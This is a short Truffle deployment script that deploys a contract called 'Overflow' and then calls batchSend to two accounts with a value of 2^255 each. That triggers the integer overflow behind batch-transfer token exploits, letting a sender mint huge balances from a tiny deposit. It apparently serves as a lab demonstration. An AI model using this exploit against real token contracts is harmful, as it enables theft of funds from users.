const Overflow = artifacts.require('Overflow')

module.exports = async function (deployer, network, accounts) {
  await deployer.deploy(Overflow)
  let instance = await Overflow.deployed()
  await instance.contribute({ from: accounts[0], value: 10000 })
  await instance.batchSend(
    [accounts[1], accounts[2]],
    BigInt(0x8000000000000000000000000000000000000000000000000000000000000000),
    { from: accounts[0] }
  )
}
